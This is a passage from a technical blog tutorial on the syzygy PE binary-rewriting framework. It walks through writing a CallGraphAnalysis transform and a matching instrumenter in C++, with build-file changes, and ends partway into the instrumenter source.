</span><span class='line'>  <span class="n">kAbsoluteAddressType</span><span class="p">,</span>
</span><span class='line'>  <span class="n">kFileOffsetAddressType</span><span class="p">,</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// This class implements an address in a PE image file.</span>
</span><span class='line'><span class="c1">// Addresses are of three varieties:</span>
</span><span class='line'><span class="c1">// - Relative addresses are relative to the base of the image, and thus do not</span>
</span><span class='line'><span class="c1">//   change when the image is relocated. Bulk of the addresses in the PE image</span>
</span><span class='line'><span class="c1">//   format itself are of this variety, and that&#39;s where relative addresses</span>
</span><span class='line'><span class="c1">//   crop up most frequently.</span>
</span><span class='line'><span class="c1">// This class is a lightweight wrapper for an integer, which can be freely</span>
</span><span class='line'><span class="c1">// copied. The different address types are deliberately assignment</span>
</span><span class='line'><span class="c1">// incompatible, which helps to avoid confusion when handling different</span>
</span><span class='line'><span class="c1">// types of addresses in implementation.</span>
</span><span class='line'><span class="k">template</span> <span class="o">&lt;</span><span class="n">AddressType</span> <span class="n">kType</span><span class="o">&gt;</span>
</span><span class='line'><span class="k">class</span> <span class="nc">AddressImpl</span> <span class="p">{};</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// A virtual address relative to the image base, often termed RVA in</span>
</span><span class='line'><span class="c1">// documentation and in data structure comments.</span>
</span><span class='line'><span class="k">using</span> <span class="n">RelativeAddress</span> <span class="o">=</span> <span class="n">detail</span><span class="o">::</span><span class="n">AddressImpl</span><span class="o">&lt;</span><span class="n">kRelativeAddressType</span><span class="o">&gt;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now that you have been introduced to the main concepts, it is time for me to walk you through two small applications.</p>

<h2>CallGraphAnalysis</h2>

<h3>The plan</h3>

<p>As the framework exposes all the information you need to rewrite and analyze binary, you are also free to <em>just</em> analyze a binary and not modify a single bit. In this example let&rsquo;s make a Block transform and generate a graph of the relationship between code Blocks (functions). As we are interested in exploring the whole binary and every single code Block, we subclass <code>IterativeTransformImpl</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="c1">// Declares a BlockGraphTransform implementation wrapping the common transform</span>
</span><span class='line'><span class="c1">// that iterates over each block in the image.</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1">// An implementation of a BlockGraph transform encapsulating the simple pattern</span>
</span><span class='line'><span class="c1">// of Pre, per-block, and Post functions. The derived class is responsible for</span>
</span><span class='line'><span class="c1">// implementing &#39;OnBlock&#39; and &#39;name&#39;, and may optionally override Pre and</span>
</span><span class='line'><span class="c1">// Post. The derived type needs to also define the static public member</span>
</span><span class='line'><span class="c1">// variable:</span>
</span><span class='line'><span class="c1">//</span>
</span><span class='line'><span class="c1">//   static const char DerivedType::kTransformName[];</span>
</span><span class='line'><span class="c1">//</span>
</span><span class='line'><span class="c1">// @tparam DerivedType the type of the derived class.</span>
</span><span class='line'><span class="k">template</span><span class="o">&lt;</span><span class="k">class</span> <span class="nc">DerivedType</span><span class="o">&gt;</span>
</span><span class='line'><span class="k">class</span> <span class="nc">IterativeTransformImpl</span>
</span><span class='line'>    <span class="o">:</span> <span class="k">public</span> <span class="n">NamedBlockGraphTransformImpl</span><span class="o">&lt;</span><span class="n">DerivedType</span><span class="o">&gt;</span> <span class="p">{</span> <span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>Doing so allows us define <code>Pre</code> / <code>Post</code> functions, and an <code>OnBlock</code> function that gets called for every Block encountered in the image. This is pretty handy as I can define an <code>OnBlock</code> callback to mine the information we want for every Block, and define <code>Post</code> to process the data I have accumulated if necessary.</p>

<p>The <code>OnBlock</code> function should be pretty light as we only want to achieve a couple of things:</p>

<ol>
<li> Make sure we are dealing with a code Block (and not data),</li>
<li> Walk every referrers and store pairs of [<code>ReferrerBlock</code>, <code>CurrentBlock</code>] in a container.</li>
</ol>


<h3>Implementation</h3>

<p>The first thing to do is to create a C++ class named <code>CallGraphAnalysis</code>, declared in <code>doare_transform.h</code> and defined in <code>doare_transform.cc</code>. Those files are put in the <code>syzygy/instrument/transforms</code> directory where all others transforms live in:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="nl">D:</span><span class="err">\</span><span class="n">syzygy</span><span class="err">\</span><span class="n">src</span><span class="o">&gt;</span><span class="n">git</span> <span class="n">status</span>
</span><span class='line'><span class="n">On</span> <span class="n">branch</span> <span class="n">dev</span><span class="o">-</span><span class="n">doare1</span>
</span><span class='line'><span class="n">Changes</span> <span class="n">to</span> <span class="n">be</span> <span class="nl">committed:</span>
</span><span class='line'>  <span class="p">(</span><span class="n">use</span> <span class="s">&quot;git reset HEAD &lt;file&gt;...&quot;</span> <span class="n">to</span> <span class="n">unstage</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">new</span> <span class="nl">file:</span>   <span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">transforms</span><span class="o">/</span><span class="n">doare_transforms</span><span class="p">.</span><span class="n">cc</span>
</span><span class='line'>        <span class="k">new</span> <span class="nl">file:</span>   <span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">transforms</span><span class="o">/</span><span class="n">doare_transforms</span><span class="p">.</span><span class="n">h</span>
</span></code></pre></td></tr></table></div></figure>


<p>In order to get it compiled we also need to modify the <code>instrument.gyp</code> project file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="nl">D:</span><span class="err">\</span><span class="n">syzygy</span><span class="err">\</span><span class="n">src</span><span class="o">&gt;</span><span class="n">git</span> <span class="n">diff</span> <span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument</span><span class="p">.</span><span class="n">gyp</span>
</span><span class='line'><span class="n">diff</span> <span class="o">--</span><span class="n">git</span> <span class="n">a</span><span class="o">/</span><span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument</span><span class="p">.</span><span class="n">gyp</span> <span class="n">b</span><span class="o">/</span><span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument</span><span class="p">.</span><span class="n">gyp</span>
</span><span class='line'><span class="n">index</span> <span class="mi">464</span><span class="n">c5566</span><span class="p">..</span><span class="n">c0eceb87</span> <span class="mi">100644</span>
</span><span class='line'><span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument</span><span class="p">.</span><span class="n">gyp</span>
</span><span class='line'><span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrument</span><span class="p">.</span><span class="n">gyp</span>
</span><span class='line'><span class="err">@@</span> <span class="o">-</span><span class="mi">68</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">70</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">branch_hook_transform</span><span class="p">.</span><span class="n">h</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">coverage_transform</span><span class="p">.</span><span class="n">cc</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">coverage_transform</span><span class="p">.</span><span class="n">h</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'><span class="o">+</span>        <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">doare_transforms</span><span class="p">.</span><span class="n">cc</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'><span class="o">+</span>        <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">doare_transforms</span><span class="p">.</span><span class="n">h</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">entry_call_transform</span><span class="p">.</span><span class="n">cc</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">entry_call_transform</span><span class="p">.</span><span class="n">h</span><span class="err">&#39;</span><span class="p">,</span>
</span><span class='line'>         <span class="err">&#39;</span><span class="n">transforms</span><span class="o">/</span><span class="n">entry_thunk_transform</span><span class="p">.</span><span class="n">cc</span><span class="err">&#39;</span><span class="p">,</span>
</span></code></pre></td></tr></table></div></figure>


<p>The gyp file is basically used to generate Ninja project files &ndash; which means that if you don&rsquo;t regenerate the Ninja files from the updated version of this gyp file, you will not be compiling your new code. In order to force a regeneration, you can invoke the <code>depot_tools</code> command: <code>gclient runhooks</code>.</p>

<p>At this point we are ready to get our class coded up; here is the class declaration I have:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="c1">// Axel &#39;0vercl0k&#39; Souchet - 26 Aug 2017</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#ifndef SYZYGY_INSTRUMENT_TRANSFORMS_DOARE_TRANSFORMS_H_</span>
</span><span class='line'><span class="cp">#define SYZYGY_INSTRUMENT_TRANSFORMS_DOARE_TRANSFORMS_H_</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &quot;base/logging.h&quot;</span>
</span><span class='line'><span class="cp">#include &quot;syzygy/block_graph/transform_policy.h&quot;</span>
</span><span class='line'><span class="cp">#include &quot;syzygy/block_graph/transforms/iterative_transform.h&quot;</span>
</span><span class='line'><span class="cp">#include &quot;syzygy/block_graph/transforms/named_transform.h&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">namespace</span> <span class="n">instrument</span> <span class="p">{</span>
</span><span class='line'><span class="k">namespace</span> <span class="n">transforms</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'><span class="k">typedef</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span> <span class="n">BlockGraph</span><span class="p">;</span>
</span><span class='line'><span class="k">typedef</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Block</span> <span class="n">Block</span><span class="p">;</span>
</span><span class='line'><span class="k">typedef</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">TransformPolicyInterface</span> <span class="n">TransformPolicyInterface</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">CallGraphAnalysis</span>
</span><span class='line'>    <span class="o">:</span> <span class="k">public</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">transforms</span><span class="o">::</span><span class="n">IterativeTransformImpl</span><span class="o">&lt;</span>
</span><span class='line'>          <span class="n">CallGraphAnalysis</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'> <span class="k">public</span><span class="o">:</span>
</span><span class='line'>  <span class="n">CallGraphAnalysis</span><span class="p">()</span>
</span><span class='line'>      <span class="o">:</span> <span class="n">edges_</span><span class="p">(),</span>
</span><span class='line'>        <span class="n">main_block_</span><span class="p">(</span><span class="n">nullptr</span><span class="p">),</span>
</span><span class='line'>        <span class="n">total_blocks_</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span><span class='line'>        <span class="n">total_code_blocks_</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">kTransformName</span><span class="p">[];</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// Functions needed for IterativeTransform.</span>
</span><span class='line'>  <span class="kt">bool</span> <span class="n">OnBlock</span><span class="p">(</span><span class="k">const</span> <span class="n">TransformPolicyInterface</span><span class="o">*</span> <span class="n">policy</span><span class="p">,</span>
</span><span class='line'>               <span class="n">BlockGraph</span><span class="o">*</span> <span class="n">block_graph</span><span class="p">,</span>
</span><span class='line'>               <span class="n">Block</span><span class="o">*</span> <span class="n">block</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'> <span class="k">private</span><span class="o">:</span>
</span><span class='line'>  <span class="n">std</span><span class="o">::</span><span class="n">list</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="n">Block</span><span class="o">*</span><span class="p">,</span> <span class="n">Block</span><span class="o">*&gt;&gt;</span> <span class="n">edges_</span><span class="p">;</span>
</span><span class='line'>  <span class="n">Block</span><span class="o">*</span> <span class="n">main_block_</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// Stats.</span>
</span><span class='line'>  <span class="n">size_t</span> <span class="n">total_blocks_</span><span class="p">;</span>
</span><span class='line'>  <span class="n">size_t</span> <span class="n">total_code_blocks_</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>  <span class="c1">// namespace transforms</span>
</span><span class='line'><span class="p">}</span>  <span class="c1">// namespace instrument</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#endif  </span><span class="c1">// SYZYGY_INSTRUMENT_TRANSFORMS_DOARE_TRANSFORMS_H_</span>
</span></code></pre></td></tr></table></div></figure>


<p>After declaring it, the interesting part for us is to have a look at the <code>OnBlock</code> method:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="kt">bool</span> <span class="n">CallGraphAnalysis</span><span class="o">::</span><span class="n">OnBlock</span><span class="p">(</span><span class="k">const</span> <span class="n">TransformPolicyInterface</span><span class="o">*</span> <span class="n">policy</span><span class="p">,</span>
</span><span class='line'>                                <span class="n">BlockGraph</span><span class="o">*</span> <span class="n">block_graph</span><span class="p">,</span>
</span><span class='line'>                                <span class="n">Block</span><span class="o">*</span> <span class="n">block</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">total_blocks_</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">block</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">()</span> <span class="o">!=</span> <span class="n">BlockGraph</span><span class="o">::</span><span class="n">CODE_BLOCK</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">block</span><span class="o">-&gt;</span><span class="n">attributes</span><span class="p">()</span> <span class="o">&amp;</span> <span class="n">BlockGraph</span><span class="o">::</span><span class="n">GAP_BLOCK</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">VLOG</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">__FUNCTION__</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;: &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">block</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">();</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">block</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">()</span> <span class="o">==</span> <span class="s">&quot;main&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">main_block_</span> <span class="o">=</span> <span class="n">block</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// Walk the referrers of this block.</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="k">auto</span><span class="o">&amp;</span> <span class="n">referrer</span> <span class="o">:</span> <span class="n">block</span><span class="o">-&gt;</span><span class="n">referrers</span><span class="p">())</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">Block</span><span class="o">*</span> <span class="n">referrer_block</span><span class="p">(</span><span class="n">referrer</span><span class="p">.</span><span class="n">first</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// We are not interested in non-code referrers.</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">referrer_block</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">()</span> <span class="o">!=</span> <span class="n">BlockGraph</span><span class="o">::</span><span class="n">CODE_BLOCK</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">VLOG</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">referrer_block</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">&quot; -&gt; &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">block</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Keep track of the relation between the block &amp; its referrer.</span>
</span><span class='line'>    <span class="n">edges_</span><span class="p">.</span><span class="n">emplace_back</span><span class="p">(</span><span class="n">referrer_block</span><span class="p">,</span> <span class="n">block</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">total_code_blocks_</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first step of the method is to make sure that the Block we are dealing with is a block we want to analyze. As I have explained before, Blocks are not exclusive code Blocks. That is the reason why we check the type of the block to only accepts code Blocks. Another type of Block that syzygy artificially creates (it has no existence in the image being analyzed) is called a <code>GAP_BLOCK</code>; which is basically a block that fills a gap in the address space. For that reason we also skip those blocks.</p>

<p>At this point we have a code Block and we can start to mine whatever information needed: name, size, referrers, etc. As the thing we are mostly interested about is the relationships between the code Blocks, we have to walk the referrers. The only thing to be wary about is to also exclude data Blocks (a function pointer table would be a data Block referencing a code Block for example) there. After this minor filtering we can just add the two pointers into the container.</p>

<p>I am sure at this stage you are interested in compiling it, and get it to run on a binary. To do that we need to add the <em>plumbing</em> necessary to surface it to <code>instrument.exe</code> tool. First thing you need is an <code>instrumenter</code>, we declare it in <code>doare_instrumenter.h</code> and define it in <code>doare_instrumenter.cc</code> in the <code>syzygy/instrument/instrumenters</code> directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="nl">D:</span><span class="err">\</span><span class="n">syzygy</span><span class="err">\</span><span class="n">src</span><span class="o">&gt;</span><span class="n">git</span> <span class="n">status</span>
</span><span class='line'><span class="n">On</span> <span class="n">branch</span> <span class="n">dev</span><span class="o">-</span><span class="n">doare1</span>
</span><span class='line'><span class="n">Changes</span> <span class="n">to</span> <span class="n">be</span> <span class="nl">committed:</span>
</span><span class='line'>  <span class="p">(</span><span class="n">use</span> <span class="s">&quot;git reset HEAD &lt;file&gt;...&quot;</span> <span class="n">to</span> <span class="n">unstage</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">new</span> <span class="nl">file:</span>   <span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrumenters</span><span class="o">/</span><span class="n">doare_instrumenter</span><span class="p">.</span><span class="n">cc</span>
</span><span class='line'>        <span class="k">new</span> <span class="nl">file:</span>   <span class="n">syzygy</span><span class="o">/</span><span class="n">instrument</span><span class="o">/</span><span class="n">instrumenters</span><span class="o">/</span><span class="n">doare_instrumenter</span><span class="p">.</span><span class="n">h</span>
</span></code></pre></td></tr></table></div></figure>


<p>An instrumenter is basically a class that encapsulate the configuration and the invocation of one or several transforms. The instrumenter can receive options passed by the application, thus can set configuration flags when invoking the transforms, etc. You could imagine parsing a configuration file here, or doing any preparation needed by your transform. Then, the instrumenter registers the transform against the <code>Relinker</code> object (a bit like the pass manager in LLVM if you want to think about it this way).</p>

<p>Anyway, as our transform is trivial we basically don&rsquo;t need any of this &ldquo;preparation&rdquo;; so let&rsquo;s settle for the least required:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="c1">// Axel &#39;0vercl0k&#39; Souchet - 26 Aug 2017</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#ifndef SYZYGY_INSTRUMENT_INSTRUMENTERS_DOARE_INSTRUMENTER_H_</span>
</span><span class='line'><span class="cp">#define SYZYGY_INSTRUMENT_INSTRUMENTERS_DOARE_INSTRUMENTER_H_</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &quot;base/command_line.h&quot;</span>
</span><span class='line'><span class="cp">#include &quot;syzygy/instrument/instrumenters/instrumenter_with_agent.h&quot;</span>
</span><span class='line'><span class="cp">#include &quot;syzygy/instrument/transforms/doare_transforms.h&quot;</span>
</span><span class='line'><span class="cp">#include &quot;syzygy/pe/pe_relinker.h&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">namespace</span> <span class="n">instrument</span> <span class="p">{</span>
</span><span class='line'><span class="k">namespace</span> <span class="n">instrumenters</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">DoareInstrumenter</span> <span class="o">:</span> <span class="k">public</span> <span class="n">InstrumenterWithRelinker</span> <span class="p">{</span>
</span><span class='line'> <span class="k">public</span><span class="o">:</span>
</span><span class='line'>  <span class="k">typedef</span> <span class="n">InstrumenterWithRelinker</span> <span class="n">Super</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">DoareInstrumenter</span><span class="p">()</span> <span class="o">:</span> <span class="n">Super</span><span class="p">()</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// From InstrumenterWithRelinker</span>
</span><span class='line'>  <span class="kt">bool</span> <span class="n">InstrumentPrepare</span><span class="p">()</span> <span class="n">override</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">bool</span> <span class="n">InstrumentImpl</span><span class="p">()</span> <span class="n">override</span><span class="p">;</span>
</span><span class='line'>  <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">InstrumentationMode</span><span class="p">()</span> <span class="n">override</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'> <span class="k">private</span><span class="o">:</span>
</span><span class='line'>  <span class="c1">// The transform for this agent.</span>
</span><span class='line'>  <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="n">instrument</span><span class="o">::</span><span class="n">transforms</span><span class="o">::</span><span class="n">CallGraphAnalysis</span><span class="o">&gt;</span>
</span><span class='line'>      <span class="n">transformer_callgraph_</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">DISALLOW_COPY_AND_ASSIGN</span><span class="p">(</span><span class="n">DoareInstrumenter</span><span class="p">);</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>  <span class="c1">// namespace instrumenters</span>
</span><span class='line'><span class="p">}</span>  <span class="c1">// namespace instrument</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#endif  </span><span class="c1">// SYZYGY_INSTRUMENT_INSTRUMENTERS_DOARE_INSTRUMENTER_H_</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>InstrumentPrepare</code> method is where the instrumenter registers the transform against the relinker object:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="c1">// Axel &#39;0vercl0k&#39; Souchet - 26 Aug 2017</span>
</span><span class='line'>
